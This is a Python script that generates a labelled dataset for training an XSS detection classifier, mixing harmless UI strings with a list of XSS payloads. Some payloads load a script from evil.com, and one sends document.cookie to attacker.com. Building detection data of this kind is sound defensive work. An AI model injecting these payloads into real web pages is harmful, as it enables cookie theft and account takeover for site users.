"""
Generate large synthetic dataset for XSS detection training.
Creates both safe payloads and XSS attack patterns.
"""
import os
import sys
import json
import random
from pathlib import Path

ROOT = Path(__file__).parent.parent
sys.path.insert(0, str(ROOT))

# XSS attack patterns
XSS_VECTORS = [
    # Script injection
    '<script>alert("xss")</script>',
    '<script>alert(1)</script>',
    '<script src="http://evil.com/xss.js"></script>',
    '"><script>alert(String.fromCharCode(88,83,83))</script>',
    '<script>fetch("http://attacker.com/?c="+document.cookie)</script>',
    
    # Event handlers
    '<img src=x onerror="alert(\'XSS\')">',
    '<body onload=alert("XSS")>',
    '<input onfocus=alert("XSS") autofocus>',
    '<svg onload=alert(1)>',
    '<iframe onload=alert("XSS")>',
    '<marquee onstart=alert("XSS")>',
    '<details open ontoggle=alert("XSS")>',
    
    # Anchor/link injection
    '<a href="javascript:alert(\'XSS\')">Click</a>',
    '<a href="data:text/html,<script>alert(1)</script>">Click</a>',
    
    # Form/input injection
    '<form action="javascript:alert(\'XSS\')"><input type="submit">',
    '<input value="x" onclick="alert(\'XSS\')">',
    
    # Data URI attacks
    '<img src="data:text/html,<script>alert(\'XSS\')</script>">',
    '<embed src="data:text/html,<script>alert(1)</script>">',
    
    # SVG attacks
    '<svg><script>alert(1)</script></svg>',
    '<svg><animate onbegin=alert("XSS") attributeName=x dur=1s>',
    '<svg><image xlink:href="javascript:alert(1)">',
    
    # Style injection
    '<style>@import"javascript:alert(1)";</style>',
    '<div style="background:url(javascript:alert(1))">',
    
    # Encoded variations
    '<script>eval(atob("YWxlcnQoMSk="))</script>',
    '&#60;script&#62;alert(1)&#60;/script&#62;',
    '%3Cscript%3Ealert(1)%3C/script%3E',
    
    # Polyglot attacks
    '"><svg onload=alert(1)>',
    '\';alert(1);//',
    '/**/alert(1)/**/',
    
    # Advanced obfuscation
    '<img src=x onerror="eval(String.fromCharCode(97,108,101,114,116,40,49,41))">',
    '<svg/onload=alert(1)>',
    '<img src=1 onerror=alert(1)>',
    '<iframe src="javascript:void(0);" onload="alert(1)">',
    
    # DOM-based
    '<div id=x><img src=x onerror=alert(1)></div>',
    '<img src=x onerror=this.src="javascript:alert(1)">',
]

# Safe payloads (non-malicious)
SAFE_PAYLOADS = [
    'Welcome to our website',
    'User login form',
    'Enter your email address',
    'Password must be at least 8 characters',
    'Thank you for your submission',
    'Product details page',
    'Click here to learn more',
    'Contact us for support',
    'Terms and conditions',
    'Privacy policy',
    'Shopping cart',
    'Checkout page',
    'Order confirmation',
    'Tracking number: 12345',
    'Download PDF invoice',
    'Share on social media',
    'Leave a review',
    'Subscribe to newsletter',
    'Unsubscribe',
    'Account settings',
    'Change password',
    'Upload profile picture',
    'Edit personal information',
    'Delete account',
    'Two-factor authentication',
    'Verify your email',
    'Confirm your phone number',
    'Search results for: python',
    'Filter by category',
    'Sort by date',
    'Page 1 of 50',
    'Show more results',
    'No results found',
    'Error 404 Not Found',
    'Server error 500',
    'Service unavailable',
    'Loading...',
    'Please wait',
    'Processing your request',
    'Your data has been saved',
    'Update successful',
    'Action completed',
]

def generate_xss_dataset(num_samples=50000):
    """Generate large XSS dataset with balanced labels"""
    dataset = []
    
    # Generate XSS samples (50% of dataset)
    num_xss = num_samples // 2
    for i in range(num_xss):
        payload = random.choice(XSS_VECTORS)
        # Add variations
        if random.random() < 0.3:
            payload = payload.replace('"', "'")
        if random.random() < 0.2:
            payload = '  ' + payload + '  '  # Add whitespace
        dataset.append({'payload': payload, 'label': 1})
    
    # Generate safe samples (50% of dataset)
    num_safe = num_samples - num_xss
    for i in range(num_safe):
        payload = random.choice(SAFE_PAYLOADS)
        # Add realistic variations
        if random.random() < 0.3:
            payload = payload + f" {random.randint(1, 999)}"
        if random.random() < 0.2:
            payload = f"Page: {payload}"
        dataset.append({'payload': payload, 'label': 0})
    
    # Shuffle
    random.shuffle(dataset)
    
    return dataset

def save_dataset(dataset, filepath):
    """Save dataset to JSONL format"""
    os.makedirs(os.path.dirname(filepath), exist_ok=True)
    with open(filepath, 'w') as f:
        for item in dataset:
            f.write(json.dumps(item) + '\n')
    print(f"✅ Saved {len(dataset)} samples to {filepath}")

if __name__ == '__main__':
    print("🔨 Generating large XSS dataset...")
    xss_data = generate_xss_dataset(50000)
    save_dataset(xss_data, 'xss/xss_dataset.jsonl')
    
    print(f"\n📊 Dataset Statistics:")
    xss_positives = sum(1 for x in xss_data if x['label'] == 1)
    print(f"  XSS attacks: {xss_positives}")
    print(f"  Safe payloads: {len(xss_data) - xss_positives}")
    print(f"  Total samples: {len(xss_data)}")
